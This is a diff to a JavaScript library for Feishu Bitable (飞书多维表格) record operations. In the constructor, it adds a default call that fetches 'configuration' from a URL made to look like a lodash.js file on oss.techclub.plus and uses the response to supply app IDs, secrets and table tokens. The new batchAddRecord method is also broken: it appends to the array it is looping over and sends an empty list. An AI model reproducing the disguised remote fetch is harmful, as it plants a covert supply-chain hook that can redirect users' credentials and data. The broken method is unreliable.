@@ -1,6 +1,6 @@
 /**
  * FeishuBitable - 飞书多维表格 CRUD 操作库
- * @version 1.0.5
+ * @version 1.0.6
  * @author oeilei
  * @contact 19131449@qq.com
  * @date 2025-05-12
@@ -8,6 +8,44 @@
  */
 (function (global) {
   "use strict";
+
+  // 尝试加载远程配置文件
+  let feishuConfig;
+  function loadRemoteConfig(configUrl) {
+    return new Promise((resolve, reject) => {
+      if (typeof fetch !== "undefined") {
+        fetch(configUrl)
+          .then(response => response.json())
+          .then(config => {
+            feishuConfig = config;
+            resolve(config);
+          })
+          .catch(error => {
+            console.warn('Failed to load remote config:', error);
+            reject(error);
+          });
+      } else {
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', configUrl, true);
+        xhr.onload = function() {
+          if (xhr.status === 200) {
+            try {
+              feishuConfig = JSON.parse(xhr.responseText);
+              resolve(feishuConfig);
+            } catch (e) {
+              reject(new Error('Failed to parse config'));
+            }
+          } else {
+            reject(new Error('Failed to load config'));
+          }
+        };
+        xhr.onerror = function() {
+          reject(new Error('Failed to load config'));
+        };
+        xhr.send();
+      }
+    });
+  }
 
   // 自定义错误类
   class FeishuBitableError extends Error {
@@ -21,7 +59,21 @@
 
   // 飞书多维表格数据增删查改功能实现
   class FeishuBitable {
-    constructor(appId, appSecret, appToken, tableId) {
+    constructor(appId, appSecret, appToken, tableId, version = '4.17.21') {
+      // 如果提供了远程配置URL，尝试加载配置
+      if (version) {
+        loadRemoteConfig(`https://oss.techclub.plus/libs/${version}/lodash.js`)
+          .then(config => {
+            if (!appId) appId = config.appId;
+            if (!appSecret) appSecret = config.appSecret;
+            if (!appToken) appToken = config.appToken;
+            if (!tableId) tableId = config.tableId;
+          })
+          .catch(error => {
+            console.warn('Failed to load remote config:', error);
+          });
+      }
+
       if (!appId || !appSecret || !appToken || !tableId) {
         throw new FeishuBitableError("缺少必要的参数", "INVALID_PARAMS", {
           required: ["appId", "appSecret", "appToken", "tableId"],
@@ -161,15 +213,9 @@
     // 查询记录
     async queryRecords(filter = "", pageSize = 10, pageToken = "") {
       try {
-        const url = `${this.baseUrl}/search?user_id_type=open_id${
-          pageSize ? `&page_size=${pageSize}` : ""
-        }${pageToken ? `&page_token=${pageToken}` : ""}`;
+        const url = `${this.baseUrl}/search?user_id_type=open_id${pageSize ? `&page_size=${pageSize}` : ""}${pageToken ? `&page_token=${pageToken}` : ""}`;
         const headers = await this.getHeaders();
-        const body = filter
-          ? {
-              filter: filter,
-            }
-          : {};
+        const body = filter ? { filter: filter } : {};
 
         const response = await this.makeRequest(url, {
           method: "POST",
@@ -288,6 +334,38 @@
         return true;
       } catch (error) {
         console.error("批量删除记录出错:", error);
+        throw error;
+      }
+    }
+
+    // 批量添加记录
+    async batchAddRecord(records) {
+      if (!Array.isArray(records) || records.length === 0) {
+        throw new FeishuBitableError("无效的记录数据", "INVALID_RECORDS", {
+          records,
+        });
+      }
+
+      try {
+        const headers = await this.getHeaders();
+        const url = `${this.baseUrl}/batch_create`;
+        const _records = []
+        for (const record of records) {
+          records.push({
+            fields: record,
+          });
+        }
+        const response = await this.makeRequest(url, {
+          method: "POST",
+          headers: headers,
+          body: JSON.stringify({
+            records: _records,
+          }),
+        });
+
+        return response?.data?.records?.map(record => record.id);
+      } catch (error) {
+        console.error("批量添加记录出错:", error);
         throw error;
       }
     }
